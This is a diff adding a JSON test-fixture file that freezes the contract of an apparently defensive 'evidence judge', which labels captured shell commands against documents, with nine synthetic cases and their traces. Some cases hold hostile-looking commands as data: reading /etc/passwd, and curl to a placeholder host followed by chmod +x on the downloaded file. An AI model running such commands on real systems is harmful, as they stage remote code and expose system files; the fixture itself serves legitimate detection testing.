@@ -1,0 +1,363 @@
+{
+  "aws_changed": false,
+  "captured_commands_executed": false,
+  "freeze_schema": "ragin.evidence_judge.contract_freeze.v1",
+  "freeze_sha256": "10714e3c868ab6ca496a33a7464de69be176b88de518123f775214bfee8212ea",
+  "historical_evaluations_reused": false,
+  "model_inference_used": false,
+  "paid_api_used": false,
+  "source_sha256": {
+    "docs/evidence_judge/EVIDENCE_JUDGE_CONTRACT_V1.md": "26f328c8ad0bc5606247e345bd109d6a145e61fc7a0eb9fe564cacf9b4d7038b",
+    "ragin/decision_fusion_v4/benchmark.py": "fb97715c3eb8f69bec6ac2c66fa52c4322962e082651a5eb8e32435cdbeb74d3",
+    "ragin/decision_fusion_v4/evidence_export.py": "32e97e539485ac518a8304bf07faab929d98bee2f137369761aef2beacba5539",
+    "ragin/don/__init__.py": "c978bda41d297f8d4d9d85b681f364ddddf1d3cec9c9629bd1cf400b451d1975",
+    "ragin/don/evidence_judge.py": "4ca7a30981fd209b2105119c9de61f509b3314537567f21fbef6ed2527c593c8",
+    "scripts/freeze_evidence_judge_contract.py": "4bbbf15fbedd2a7b32040c5eb1a528b20f33484a490aed0682b6201cfc768f92",
+    "tests/unit/test_evidence_judge.py": "a590b47b68dbee9067abdc59fcda4a16b160ade80733c272fae02c90455964e7"
+  },
+  "status": "EVIDENCE_JUDGE_CONTRACT_READY",
+  "synthetic_cases": [
+    {
+      "case_id": "relevant",
+      "command": "uname -a",
+      "preceding_commands": [],
+      "trace": {
+        "adapter_kind": "deterministic",
+        "candidate_judgments": [
+          {
+            "context_status": "PRESENT",
+            "doc_id": "d1",
+            "label": "SUPPORTED",
+            "provenance_sufficient": true,
+            "rationale_codes": [
+              "command_pattern_or_behavior_match"
+            ],
+            "relates_to_command": true,
+            "substantively_supports_behavior": true,
+            "support_kind": "SUPPORTED"
+          }
+        ],
+        "command": "uname -a",
+        "context_missing_or_ambiguous": false,
+        "contract_version": "EVIDENCE_JUDGE_V1",
+        "judge_version": "DETERMINISTIC_COMMAND_GROUNDED_V1",
+        "probabilities": {},
+        "sufficiency": {
+          "contradictory_doc_ids": [],
+          "label": "SUFFICIENT",
+          "policy_behavior": "discovery",
+          "rationale_codes": [
+            "direct_behavior_support"
+          ],
+          "supporting_doc_ids": [
+            "d1"
+          ]
+        },
+        "trace_sha256": "143b0e4728a74a0a0eff8d1879dc14d2c97a51678f34645e9750f55a7b7b10d6"
+      }
+    },
+    {
+      "case_id": "adjacent",
+      "command": "uname -a",
+      "preceding_commands": [],
+      "trace": {
+        "adapter_kind": "deterministic",
+        "candidate_judgments": [
+          {
+            "context_status": "PRESENT",
+            "doc_id": "d1",
+            "label": "IRRELEVANT",
+            "provenance_sufficient": true,
+            "rationale_codes": [
+              "no_command_relation"
+            ],
+            "relates_to_command": false,
+            "substantively_supports_behavior": false,
+            "support_kind": "IRRELEVANT"
+          }
+        ],
+        "command": "uname -a",
+        "context_missing_or_ambiguous": false,
+        "contract_version": "EVIDENCE_JUDGE_V1",
+        "judge_version": "DETERMINISTIC_COMMAND_GROUNDED_V1",
+        "probabilities": {},
+        "sufficiency": {
+          "contradictory_doc_ids": [],
+          "label": "INSUFFICIENT",
+          "policy_behavior": "discovery",
+          "rationale_codes": [
+            "no_substantive_support"
+          ],
+          "supporting_doc_ids": []
+        },
+        "trace_sha256": "a7b6cdf9cedbdab8d3c275ea22ecd19f76729c2de06b377986d637acd3aa25ee"
+      }
+    },
+    {
+      "case_id": "partial",
+      "command": "cat /etc/passwd",
+      "preceding_commands": [],
+      "trace": {
+        "adapter_kind": "deterministic",
+        "candidate_judgments": [
+          {
+            "context_status": "PRESENT",
+            "doc_id": "d1",
+            "label": "IRRELEVANT",
+            "provenance_sufficient": true,
+            "rationale_codes": [
+              "no_command_relation"
+            ],
+            "relates_to_command": false,
+            "substantively_supports_behavior": false,
+            "support_kind": "IRRELEVANT"
+          }
+        ],
+        "command": "cat /etc/passwd",
+        "context_missing_or_ambiguous": false,
+        "contract_version": "EVIDENCE_JUDGE_V1",
+        "judge_version": "DETERMINISTIC_COMMAND_GROUNDED_V1",
+        "probabilities": {},
+        "sufficiency": {
+          "contradictory_doc_ids": [],
+          "label": "INSUFFICIENT",
+          "policy_behavior": "discovery",
+          "rationale_codes": [
+            "no_substantive_support"
+          ],
+          "supporting_doc_ids": []
+        },
+        "trace_sha256": "378b4ea1b73eb9bda96a3d5b9c656b5f03c419babbd5ec72275d8636e17e3426"
+      }
+    },
+    {
+      "case_id": "conflicting",
+      "command": "curl http://example.invalid/payload",
+      "preceding_commands": [],
+      "trace": {
+        "adapter_kind": "deterministic",
+        "candidate_judgments": [
+          {
+            "context_status": "PRESENT",
+            "doc_id": "d1",
+            "label": "SUPPORTED",
+            "provenance_sufficient": true,
+            "rationale_codes": [
+              "command_pattern_or_behavior_match"
+            ],
+            "relates_to_command": true,
+            "substantively_supports_behavior": true,
+            "support_kind": "SUPPORTED"
+          },
+          {
+            "context_status": "PRESENT",
+            "doc_id": "d2",
+            "label": "CONTRADICTORY",
+            "provenance_sufficient": true,
+            "rationale_codes": [
+              "explicit_contradiction"
+            ],
+            "relates_to_command": true,
+            "substantively_supports_behavior": true,
+            "support_kind": "CONTRADICTORY"
+          }
+        ],
+        "command": "curl http://example.invalid/payload",
+        "context_missing_or_ambiguous": false,
+        "contract_version": "EVIDENCE_JUDGE_V1",
+        "judge_version": "DETERMINISTIC_COMMAND_GROUNDED_V1",
+        "probabilities": {},
+        "sufficiency": {
+          "contradictory_doc_ids": [
+            "d2"
+          ],
+          "label": "CONFLICTING",
+          "policy_behavior": "discovery",
+          "rationale_codes": [
+            "supported_and_contradictory_evidence"
+          ],
+          "supporting_doc_ids": [
+            "d1"
+          ]
+        },
+        "trace_sha256": "6830bc9267ac5402dc3dd2d9075ec2996c73134d2354b70259bdc831b5105f1f"
+      }
+    },
+    {
+      "case_id": "ambiguous",
+      "command": "echo 'unterminated",
+      "preceding_commands": [],
+      "trace": {
+        "adapter_kind": "deterministic",
+        "candidate_judgments": [
+          {
+            "context_status": "AMBIGUOUS",
+            "doc_id": "d1",
+            "label": "PARTIAL",
+            "provenance_sufficient": true,
+            "rationale_codes": [
+              "related_without_direct_behavior_support"
+            ],
+            "relates_to_command": true,
+            "substantively_supports_behavior": true,
+            "support_kind": "PARTIAL"
+          }
+        ],
+        "command": "echo 'unterminated",
+        "context_missing_or_ambiguous": true,
+        "contract_version": "EVIDENCE_JUDGE_V1",
+        "judge_version": "DETERMINISTIC_COMMAND_GROUNDED_V1",
+        "probabilities": {},
+        "sufficiency": {
+          "contradictory_doc_ids": [],
+          "label": "UNKNOWN",
+          "policy_behavior": "discovery",
+          "rationale_codes": [
+            "ambiguous_command_context"
+          ],
+          "supporting_doc_ids": []
+        },
+        "trace_sha256": "a5a29ec1412e1e5103331ebae6b5da698476f51934b144019d7a4665d8047407"
+      }
+    },
+    {
+      "case_id": "multi_command",
+      "command": "chmod +x /tmp/x",
+      "preceding_commands": [
+        "curl http://example.invalid/x -o /tmp/x"
+      ],
+      "trace": {
+        "adapter_kind": "deterministic",
+        "candidate_judgments": [
+          {
+            "context_status": "PRESENT",
+            "doc_id": "d1",
+            "label": "SUPPORTED",
+            "provenance_sufficient": true,
+            "rationale_codes": [
+              "command_pattern_or_behavior_match"
+            ],
+            "relates_to_command": true,
+            "substantively_supports_behavior": true,
+            "support_kind": "SUPPORTED"
+          }
+        ],
+        "command": "chmod +x /tmp/x",
+        "context_missing_or_ambiguous": false,
+        "contract_version": "EVIDENCE_JUDGE_V1",
+        "judge_version": "DETERMINISTIC_COMMAND_GROUNDED_V1",
+        "probabilities": {},
+        "sufficiency": {
+          "contradictory_doc_ids": [],
+          "label": "SUFFICIENT",
+          "policy_behavior": "discovery",
+          "rationale_codes": [
+            "direct_behavior_support"
+          ],
+          "supporting_doc_ids": [
+            "d1"
+          ]
+        },
+        "trace_sha256": "01a255a748076ee64d453828aed40b08d4e4a0265a684371fccb7ed41cd38bc8"
+      }
+    },
+    {
+      "case_id": "missing_provenance",
+      "command": "ssh admin@example.invalid",
+      "preceding_commands": [],
+      "trace": {
+        "adapter_kind": "deterministic",
+        "candidate_judgments": [
+          {
+            "context_status": "PRESENT",
+            "doc_id": "d1",
+            "label": "UNKNOWN",
+            "provenance_sufficient": false,
+            "rationale_codes": [
+              "insufficient_provenance"
+            ],
+            "relates_to_command": true,
+            "substantively_supports_behavior": true,
+            "support_kind": "UNKNOWN"
+          }
+        ],
+        "command": "ssh admin@example.invalid",
+        "context_missing_or_ambiguous": false,
+        "contract_version": "EVIDENCE_JUDGE_V1",
+        "judge_version": "DETERMINISTIC_COMMAND_GROUNDED_V1",
+        "probabilities": {},
+        "sufficiency": {
+          "contradictory_doc_ids": [],
+          "label": "INSUFFICIENT",
+          "policy_behavior": "discovery",
+          "rationale_codes": [
+            "no_substantive_support"
+          ],
+          "supporting_doc_ids": []
+        },
+        "trace_sha256": "dc64b360510b29aeafef38d87158d3f4d4b969ab8e7f485273fc46cc5adcdf18"
+      }
+    },
+    {
+      "case_id": "unsupported",
+      "command": "echo hello",
+      "preceding_commands": [],
+      "trace": {
+        "adapter_kind": "deterministic",
+        "candidate_judgments": [
+          {
+            "context_status": "PRESENT",
+            "doc_id": "d1",
+            "label": "IRRELEVANT",
+            "provenance_sufficient": true,
+            "rationale_codes": [
+              "no_command_relation"
+            ],
+            "relates_to_command": false,
+            "substantively_supports_behavior": false,
+            "support_kind": "IRRELEVANT"
+          }
+        ],
+        "command": "echo hello",
+        "context_missing_or_ambiguous": false,
+        "contract_version": "EVIDENCE_JUDGE_V1",
+        "judge_version": "DETERMINISTIC_COMMAND_GROUNDED_V1",
+        "probabilities": {},
+        "sufficiency": {
+          "contradictory_doc_ids": [],
+          "label": "INSUFFICIENT",
+          "policy_behavior": "discovery",
+          "rationale_codes": [
+            "no_substantive_support"
+          ],
+          "supporting_doc_ids": []
+        },
+        "trace_sha256": "8ba75d1dff76367aacc1d6884465ab2ce9f2a1b91a796bce542bacef5bc1cbaf"
+      }
+    },
+    {
+      "case_id": "safe_abstention",
+      "command": "",
+      "preceding_commands": [],
+      "trace": {
+        "adapter_kind": "deterministic",
+        "candidate_judgments": [],
+        "command": "",
+        "context_missing_or_ambiguous": true,
+        "contract_version": "EVIDENCE_JUDGE_V1",
+        "judge_version": "DETERMINISTIC_COMMAND_GROUNDED_V1",
+        "probabilities": {},
+        "sufficiency": {
+          "contradictory_doc_ids": [],
+          "label": "UNKNOWN",
+          "policy_behavior": "observed_command_behavior",
+          "rationale_codes": [
+            "ambiguous_command_context"
+          ],
+          "supporting_doc_ids": []
+        },
+        "trace_sha256": "6dc811d649914b7241406ed9e3989c2232fdedc31b1762b8d66a587962b0c1a7"
+      }
+    }
+  ]
+}
